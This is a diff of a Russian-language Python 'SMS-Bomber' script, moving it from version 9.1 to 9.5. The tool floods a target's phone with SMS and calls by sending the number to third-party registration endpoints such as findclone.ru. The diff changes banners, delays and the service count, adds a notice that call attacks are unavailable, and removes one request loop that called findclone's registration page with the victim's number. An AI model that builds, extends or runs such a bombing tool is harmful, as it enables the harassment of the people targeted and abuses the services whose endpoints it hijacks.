@@ -1,6 +1,6 @@
 
 # -*- coding: utf-8 -*-
-#   Version 9.1
+#   Version 9.5
 
 import os
 import time
@@ -8,22 +8,23 @@ import requests, random, datetime, sys, time, argparse, os , colorama
 from colorama import Fore, Back, Style
 from colorama import init
 init()
+os.system("title SMS-Bomber-300-Free")
 print(Fore.YELLOW)
 os.system("clear")
 os.system("CLS")
-print("   --|| Установка ||--")
+print("   --|| Установка/загрузка временных пакетов ||--")
 
 print(Fore.RED)
 print ("-[                    ]- 0% ")
-time.sleep(4)
+time.sleep(1)
 print ("-[=====               ]- 25%")
 time.sleep(1)
 print ("-[==========          ]- 50%")
-time.sleep(7)
+time.sleep(1)
 print ("-[===============     ]- 75%")
 time.sleep(3)
 print ("-[====================]- 100%")
-time.sleep(5)
+time.sleep(1)
 print(Fore.YELLOW)
 print ("--|| Установка Завершена ||--")
 print("Нажмите  ENTER для продолжения .....")
@@ -51,7 +52,7 @@ def banner():
     ░╚═══██╗██║╚██╔╝██║░╚═══██╗╚════╝██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗╚════╝░╚═══██╗██║░░██║██║░░██║
     ██████╔╝██║░╚═╝░██║██████╔╝░░░░░░██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║░░░░░░██████╔╝╚█████╔╝╚█████╔╝
     ╚═════╝░╚═╝░░░░░╚═╝╚═════╝░░░░░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░░░░╚═════╝░░╚════╝░░╚════╝░   
-                                                                       v.9.1 (Разработчик: Иван Зайцев)   
+                                                                       v.9.5 (Разработчик: Иван Зайцев)   
       
       __________________________________________________________________________________________
       |                                                                                         |
@@ -60,7 +61,7 @@ def banner():
       | YouTube -- https://www.youtube.com/channel/UCTftz8MsYtAE80D9Vrd20rQ?view_as=subscriber  |        
       |_________________________________________________________________________________________|                                                                                         
 
-                                   +||| На ДаНый мОмеНт сеРвИсоВ -- 240 |||+
+                                   +||| На ДаНый мОмеНт сеРвИсоВ -- 247 |||+
 
     """
 
@@ -79,11 +80,11 @@ def banner_atack():
      / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
     /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                      |___/""")
-    print ("[                    ] 0% ")
+    print ("[                    ] 1% ")
     time.sleep(2)
-    print ("[=====               ] 25%")
+    print ("[=====               ] 35%")
     time.sleep(1)
-    print ("[==========          ] 50%")
+    print ("[==========          ] 58%")
     time.sleep(1)
     print ("[====================] 100%")
     time.sleep(2)
@@ -94,14 +95,15 @@ def banner_atack():
 
 
 print(Fore.GREEN)
-
-E = input("\n Хотите попасть в настройки ? [1-Yes/2-No] >>")
+time.sleep(3)
+E = input("\n Хотите попасть в настройки ? [1-(Yes)/2-(No)] >>")
 if E == str(1):
     print(Fore.RED)
     print("--||Вы попали в настройки|| -- || Что бы выйти напишите (2) ||--")
     print(Fore.GREEN)
     p = print("\n ВК Разработчика -- https://vk.com/ivan_vzlom300  ")
     p = print("\n Разработчик не придумал что можно настроить в программе ):   Но он будет блогадарен за советы по улучшению и по дизаину программы..... ")
+    time.sleep(5)
     p = input("\n Что бы выйти напишите (2) >> ")
     if p == str(2):
         os.system("clear")
@@ -141,7 +143,9 @@ if kol == str(0):
 
 start_time = time.time() 
 CLOSE_AFTER = kol
-
+print(Fore.YELLOW)
+print("К сожелению атака звонками сейчас не доступна , буду благодерен тем кто поможет с сервисом для звонков ! Пишите в ВК ")
+print(Fore.RED)
 call = input("\n Tип атаки (1 - Атака звонками , 2 -Атака СМС) >>")
 if call == str(1):
     os.system("clear")
@@ -2745,37 +2749,7 @@ if call == str(2):
 
 
 
-        try:
-
-
-
-            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-
-            R = R + 1
-
-            print('[+] findclone звонок отправлен! || Кол-во - '+ str(R))
-
-
-
-            time.sleep(0.1)
-
-
-
-        except:
-
-
-
-            print('[-] Звонок не отпрвлен !')
-
-
-
-        if time.time() > start_time + float(CLOSE_AFTER): 
-
-            print(Fore.RED)
-
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-
-            break
+     
 
 
 
@@ -4341,27 +4315,7 @@ if call == str(2):
 
 
 
-        try:
 
-
-
-            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-
-            R = R + 1
-
-            print('[+] findclone звонок отправлен! || Кол-во - '+ str(R))
-
-
-
-            time.sleep(0.1)
-
-
-
-        except:
-
-
-
-            print('[-] Звонок не отпрвлен !')
 
 
 
